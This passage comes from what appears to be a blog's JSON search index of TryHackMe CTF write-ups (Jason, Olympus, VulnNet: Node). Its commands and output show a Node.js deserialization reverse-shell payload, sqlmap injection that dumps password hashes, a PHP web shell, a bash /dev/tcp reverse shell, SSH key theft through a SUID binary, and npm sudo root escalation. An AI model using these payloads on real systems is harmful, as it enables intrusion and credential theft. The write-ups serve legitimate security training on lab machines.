[REDACTED] In the Set-Cookie header if we decode the session value from base64 we identify a serialized object.\n  Command: echo -n \u0026quot;eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==\u0026quot; | base64 -d  geobour98@kali:~$ echo -n \u0026#34;eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==\u0026#34; | base64 -d {\u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;} Exploitation Go in Decoder in Burp Suite and craft a serialized object like this:\n{\u0026#34;email\u0026#34;:\u0026#34;_$$ND_FUNC$$_function (){require(\u0026#39;child_process\u0026#39;).exec(\\\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.200.50 443 \u0026gt;/tmp/f\\\u0026#34;, function(error, stdout, stderr) { console.log(stdout) });}()\u0026#34;} Click on Encode as and select Base64 so the output should look like this:\neyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Next, go to http://10.10.121.122, refresh the page, Intercept the request, add a Cookie header with the base64 encoded value into the session. The request should look like this:\nGET / HTTP/1.1 Host: 10.10.121.122 Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Open a netcat listener and click Forward and we get a reverse shell as dylan\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.121.122] 53470 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; dylan@jason:/opt/webapp$ whoami whoami dylan dylan@jason:/opt/webapp$ The server performed deserialization of the Cookie header so the reverse shell was executed. The payload used can be found in this great article: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/, which is about Node.js deserialization as in our case. We can also read the user.txt flag:\ndylan@jason:/opt/webapp$ cd /home/dylan cd /home/dylan dylan@jason:~$ cat user.txt cat user.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute npm without being asked for root password.\ndylan@jason:~$ sudo -l sudo -l Matching Defaults entries for dylan on jason:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User dylan may run the following commands on jason:  (ALL) NOPASSWD: /usr/bin/npm * A great exploit for this can be found on: https://gtfobins.github.io/gtfobins/npm/#sudo\ndylan@jason:~$ TF=$(mktemp -d) dylan@jason:~$ echo \u0026#39;{\u0026#34;scripts\u0026#34;: {\u0026#34;preinstall\u0026#34;: \u0026#34;/bin/sh\u0026#34;}}\u0026#39; \u0026gt; $TF/package.json dylan@jason:~$ sudo npm -C $TF --unsafe-perm i sudo npm -C $TF --unsafe-perm i  \u0026gt; @ preinstall /tmp/tmp.DaaEyPR9DZ \u0026gt; /bin/sh  # bash bash root@jason:/tmp/tmp.DaaEyPR9DZ# id id uid=0(root) gid=0(root) groups=0(root) root@jason:/tmp/tmp.DaaEyPR9DZ# cd /root cd /root root@jason:~# cat root.txt cat root.txt [REDACTED] Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/jason/","summary":"üìÜ 03/09/2022 - geobour98 ‚åö 7 min\nIntroduction This is a TryHackMe room which can be found at: Jason\nIn JavaScript everything is a terrible mistake.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0.","title":"TryHackMe - Jason"},{"content":"üìÜ 01/10/2022 - geobour98 ‚åö 10 min\nIntroduction This is a TryHackMe room which can be found at: Olympus\nMy first CTF !\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0.07s elapsed (1 total hosts) Initiating Connect Scan at 14:38 Scanning olympus.thm (10.10.203.170) [65535 ports] Discovered open port 22/tcp on 10.10.203.170 Discovered open port 80/tcp on 10.10.203.170 Completed Connect Scan at 14:39, 34.39s elapsed (65535 total ports) Nmap scan report for olympus.thm (10.10.203.170) Host is up (0.069s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 34.51 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 10.10.203.170  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:39 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating Ping Scan at 14:39 Scanning 10.10.203.170 [4 ports] Completed Ping Scan at 14:39, 0.11s elapsed (1 total hosts) Initiating SYN Stealth Scan at 14:39 Scanning olympus.thm (10.10.203.170) [2 ports] Discovered open port 80/tcp on 10.10.203.170 Discovered open port 22/tcp on 10.10.203.170 Completed SYN Stealth Scan at 14:39, 0.11s elapsed (2 total ports) Initiating Service scan at 14:39 Scanning 2 services on olympus.thm (10.10.203.170) Completed Service scan at 14:39, 6.19s elapsed (2 services on 1 host) Initiating OS detection (try #1) against olympus.thm (10.10.203.170) Retrying OS detection (try #2) against olympus.thm (10.10.203.170) Initiating Traceroute at 14:39 Completed Traceroute at 14:39, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 14:39 Completed Parallel DNS resolution of 1 host. at 14:39, 0.00s elapsed NSE: Script scanning 10.10.203.170. Initiating NSE at 14:39 Completed NSE at 14:40, 2.14s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.28s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Nmap scan report for olympus.thm (10.10.203.170) Host is up (0.068s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA) | 256 8d:56:01:ca:55üá©üá™e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA) |_ 256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Olympus |_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 26.420 days (since Sun Aug 28 04:35:21 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 67.93 ms 10.8.0.1 (10.8.0.1) 2 68.02 ms olympus.thm (10.10.203.170)  NSE: Script Post-scanning. Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds  Raw packets sent: 60 (4.236KB) | Rcvd: 42 (3.136KB) If we navigate to port 80, the page is not loading so we can curl, in verbose mode, to identify the domain name of the machine.   Command: curl -v 10.10.203.170  geobour98@kali:~$ curl -v 10.10.203.170 [REDACTED] \u0026lt; Location: http://olympus.thm [REDACTED] We found that the domain name is olympus.thm, so we can add it and its IP address in /etc/hosts file. The contents of /etc/hosts should look like this:\ngeobour98@kali:~$ cat /etc/hosts [REDACTED] 10.10.203.170 olympus.thm [REDACTED] Then, we can navigate to http://olympus.thm and see the web page. Now, we can brute force the website for directories using gobuster.   Command: gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50  geobour98@kali:~$ gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://olympus.thm/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/09/22 22:33:40 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 276] /.htpasswd.php (Status: 403) [Size: 276] /.htaccess (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htaccess.php (Status: 403) [Size: 276] /.hta.php (Status: 403) [Size: 276] /index.php (Status: 200) [Size: 1948] /index.php (Status: 200) [Size: 1948] /javascript (Status: 301) [Size: 315] [--\u0026gt; http://olympus.thm/javascript/] /phpmyadmin (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /static (Status: 301) [Size: 311] [--\u0026gt; http://olympus.thm/static/] /~webmaster (Status: 301) [Size: 315] [--\u0026gt; http://olympus.thm/~webmaster/]  =============================================================== 2022/09/22 22:33:58 Finished =============================================================== The most interesting directory is ~webmaster, so we can go to the URL: http://olympus.thm/~webmaster/ Exploitation Flag 1 After trying the searchsploit command for exploits on Victor CMS, we identify Victor CMS 1.0 - 'Search' SQL Injection (php/webapps/48734.txt), which is a SQL Injection on search parameter. There is an exploit command with sqlmap tool. We first list the available databases, then its tables, then the columns of flag table, and finally dump the flag column.\ngeobour98@kali:~$ searchsploit victor [REDACTED] Victor CMS 1.0 - \u0026#39;Search\u0026#39; SQL Injection | php/webapps/48734.txt [REDACTED] geobour98@kali:~$ searchsploit -m php/webapps/48734.txt geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch --dbs [REDACTED] available databases [6]: [*] information_schema [*] mysql [*] olympus [*] performance_schema [*] phpmyadmin [*] sys [REDACTED] geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus --tables [REDACTED] Database: olympus [6 tables] +------------+ | categories | | chats | | comments | | flag | | posts | | users | +------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T flag --columns [REDACTED] Database: olympus Table: flag [1 column] +--------+--------------+ | Column | Type | +--------+--------------+ | flag | varchar(255) | +--------+--------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T flag -C flag --dump Database: olympus Table: flag [1 entry] +---------------------------+ | flag | +---------------------------+ | [REDACTED] | +---------------------------+ Flag 2 There is another interesting table found from sqlmap, which is users and in the user_email column we can find another domain used chat.olympus.thm, so we add this too to /etc/hosts.\ngeobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T users --columns [REDACTED] Database: olympus Table: users [9 columns] +----------------+--------------+ | Column | Type | +----------------+--------------+ | randsalt | varchar(255) | | user_email | varchar(255) | | user_firstname | varchar(255) | | user_id | int | | user_image | text | | user_lastname | varchar(255) | | user_name | varchar(255) | | user_password | varchar(255) | | user_role | varchar(255) | +----------------+--------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T users -C randsalt,user_email,user_name,user_password --dump [REDACTED] Database: olympus Table: users [3 entries] +----------+------------------------+------------+--------------------------------------------------------------+ | randsalt | user_email | user_name | user_password | +----------+------------------------+------------+--------------------------------------------------------------+ | \u0026lt;blank\u0026gt; | prometheus@olympus.thm | prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | | dgas | root@chat.olympus.thm | root | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | | dgas | zeus@chat.olympus.thm | zeus | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | +----------+------------------------+------------+--------------------------------------------------------------+ [REDACTED] geobour98@kali:~$ cat /etc/hosts [REDACTED] 10.10.203.170 olympus.thm chat.olympus.thm [REDACTED] If we navigate to http://chat.olympus.thm we see a login page. Before, we found some hashes so it\u0026rsquo;s time to crack them. We will use john for the first hash $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C, which is saved in file hash, with rockyou.txt wordlist.   Command: john -w=/usr/share/wordlists/rockyou.txt hash --format=bcrypt  geobour98@kali:~$ john -w=/usr/share/wordlists/rockyou.txt hash --format=bcrypt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 12 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [REDACTED] (?) 1g 0:00:00:07 DONE (2022-09-22 23:33) 0.1386g/s 569.2p/s 569.2c/s 569.2C/s 19861986..candies Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Now we can login with username prometheus and the found password on the chat application (http://chat.olympus.thm). There is an upload functionality, so we upload cmd.php with contents:\n\u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;We don\u0026rsquo;t know where the file is uploaded to, so we can run gobuster.\n  Command: gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50  geobour98@kali:~$ gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://chat.olympus.thm/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/23 00:03:00 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 281] /.hta (Status: 403) [Size: 281] /.htpasswd (Status: 403) [Size: 281] /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /javascript (Status: 301) [Size: 325] [--\u0026gt; http://chat.olympus.thm/javascript/] /phpmyadmin (Status: 403) [Size: 281] /server-status (Status: 403) [Size: 281] /static (Status: 301) [Size: 321] [--\u0026gt; http://chat.olympus.thm/static/] /uploads (Status: 301) [Size: 322] [--\u0026gt; http://chat.olympus.thm/uploads/]  =============================================================== 2022/09/23 00:03:11 Finished =============================================================== The file cmd.php should be at http://chat.olympus.thm/uploads/cmd.php, but there was another table called chats, which contains important information: The IT guy used a random file name function to make it harder for attackers to access the uploaded files. So we have to rerun sqlmap in order to view the file name of our uploaded file.\ngeobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T chats -C dt,file,msg,uname --dump [REDACTED] Database: olympus Table: chats [3 entries] +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | dt | file | msg  | uname | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt  | prometheus | | 2022-04-05 | \u0026lt;blank\u0026gt; | This looks great! I tested an upload and found the upload folder , but it seems the filename got changed somehow because I can\u0026#39;t download it back... | prometheus | | 2022-04-06 | \u0026lt;blank\u0026gt; | I know this is pretty cool. The IT guy used a random file name f unction to make it harder for attackers to access the uploaded files. He\u0026#39;s still working on it. | zeus | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \u0026#34;http://olympus.thm/~webmaster/search.php\u0026#34; --data=\u0026#34;search=1337*\u0026amp;submit=\u0026#34; --random-agent -v 3 --batch -D olympus -T chats -C dt,file,msg,uname --dump --flush-session [REDACTED] Database: olympus Table: chats [13 entries] +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | dt | file | msg  | uname | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt  | prometheus | | 2022-04-05 | \u0026lt;blank\u0026gt; | This looks great! I tested an upload and found the upload folder , but it seems the filename got changed somehow because I can\u0026#39;t download it back... | prometheus | | 2022-04-06 | \u0026lt;blank\u0026gt; | I know this is pretty cool. The IT guy used a random file name f unction to make it harder for attackers to access the uploaded files. He\u0026#39;s still working on it. | zeus | | 2022-09-23 | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt;  | prometheus | | 2022-09-23 | c892fb409f85b25008b9d49da321df68.php | Attached : cmd.php  | prometheus | -------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ [REDACTED] Now in order to verify code execution navigate to: http://chat.olympus.thm/uploads/c892fb409f85b25008b9d49da321df68.php?cmd=id and the output is: uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web). Now we are going to get a reverse shell using Burp Suite. We Intercept the previous request, and execute a bash reverse shell like the following: bash -c 'exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.200.50/443 \u0026lt;\u0026amp;1', but it has to be URL-encoded. The request in Burp should look like this:\nGET /uploads/c892fb409f85b25008b9d49da321df68.php?cmd=bash+-c+\u0026#39;exec+bash+-i+%26\u0026gt;/dev/tcp/10.8.200.50/443+\u0026lt;%261\u0026#39; HTTP/1.1 Host: chat.olympus.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=lh3nk5s6r2577v8flvr9td45b6 Upgrade-Insecure-Requests: 1 Open a netcat listener and we have reverse shell as www-data.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.203.170] 58780 bash: cannot set terminal process group (777): Inappropriate ioctl for device bash: no job control in this shell www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026lt;ads$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ export TERM=xterm-256color www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ stty rows 38 cols 111 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ whoami www-data www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ id uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web) Then navigate to /home/zeus and open user.flag.\nwww-data@olympus:/home/zeus$ cat user.flag [REDACTED] Flag 3 Download linpeas.sh from PEASS-ng github page (https://github.com/carlospolop/PEASS-ng/releases/tag/20220918) and transfer it to the victim machine.\nwww-data@olympus:/dev/shm$ chmod +x linpeas.sh www-data@olympus:/dev/shm$ ./linpeas.sh [REDACTED] ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms ‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils (Unknown SUID binary) [REDACTED] There is an interesting SUID binary (/usr/bin/cputils), that provides copy functionality. In /home/zeus there was a folder .ssh, that should contain the private key of user zeus. So, we can copy it to /dev/shm/ and transfer it our machine in order to login as zeus.\nwww-data@olympus:/dev/shm$ /usr/bin/cputils  ____ ____ _ _ _  / ___| _ \\ _ _| |_(_) |___ | | | |_) | | | | __| | / __| | |___| __/| |_| | |_| | \\__ \\  \\____|_| \\__,_|\\__|_|_|___/  Enter the Name of Source File: /home/zeus/.ssh/id_rsa  Enter the Name of Target File: /dev/shm/id_rsa  File copied successfully. The id_rsa is password protected, so we can generate a hash of the file with ssh2john.py, then crack the hash with john and login as zeus with SSH, after modifying the permissions of the id_rsa.\ngeobour98@kali:~$ python /usr/share/john/ssh2john.py id_rsa \u0026gt; id_rsa.hash geobour98@kali:~$ john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 16 for all loaded hashes Will run 12 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [REDACTED] (id_rsa) 1g 0:00:00:13 DONE (2022-09-23 13:14) 0.07558g/s 116.0p/s 116.0c/s 116.0C/s rachelle..mexico1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. geobour98@kali:~$ chmod 600 id_rsa geobour98@kali:~$ ssh -i id_rsa zeus@10.10.203.170 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) [REDACTED] zeus@olympus:~$ id uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev) Now we are the user zeus.\nPrivilege Escalation There is an interesting folder (0aB44fdS3eDnLkpsz3deGv8TttR4sc) in /var/www/html that user zeus can access, which is owned by root. If we navigate there we see an interesting file VIGQFQFMYOST.php\nzeus@olympus:/$ cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/ zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php [REDACTED] $suid_bd = \u0026#34;/lib/defended/libc.so.99\u0026#34;; $shell = \u0026#34;uname -a; w; $suid_bd\u0026#34;; [REDACTED] The file /lib/defended/libc.so.99 is SUID binary, and if we execute the strings command we see that it executes /bin/sh, so we can run it to become root.\nzeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la /lib/defended/libc.so.99 -rwsr-xr-x 1 root root 16784 Apr 14 10:54 /lib/defended/libc.so.99 zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ strings /lib/defended/libc.so.99 [REDACTED] /bin/sh [REDACTED] zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ /lib/defended/libc.so.99 # id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus) We can read now root.flag in /root directory, and there is a hint on the 4th flag.\n# bash root@olympus:/root# cat root.flag  [REDACTED]  PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)   (Hint : regex can be usefull) Flag 4 The hint on TryHackMe\u0026rsquo;s page says that the 4th flag is located somewhere in /etc/ so we navigate there and use grep, to search recursively and ignore case sensitivity for the string flag{.\nroot@olympus:/root# cd /etc/ root@olympus:/etc# grep -Ri \u0026#34;flag{\u0026#34; ssl/private/.b0nus.fl4g:[REDACTED] ssl/private/.b0nus.fl4g:grep -irl flag{ Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/olympus/","summary":"üìÜ 01/10/2022 - geobour98 ‚åö 10 min\nIntroduction This is a TryHackMe room which can be found at: Olympus\nMy first CTF !\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0.","title":"TryHackMe - Olympus"},{"content":"üìÜ 10/09/2022 - geobour98 ‚åö 8 min\nIntroduction This is a TryHackMe room which can be found at: VulnNet: Node\nAfter the previous breach, VulnNet Entertainment states it won\u0026rsquo;t happen again. Can you prove they\u0026rsquo;re wrong?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.10.213.208 [2 ports] Completed Ping Scan at 10:44, 0.07s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 10:44 Completed Parallel DNS resolution of 1 host. at 10:44, 0.00s elapsed Initiating Connect Scan at 10:44 Scanning 10.10.213.208 (10.10.213.208) [65535 ports] Discovered open port 8080/tcp on 10.10.213.208 Completed Connect Scan at 10:45, 60.48s elapsed (65535 total ports) Nmap scan report for 10.10.213.208 (10.10.213.208) Host is up (0.070s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 8080/tcp open http-proxy  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 60.59 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the 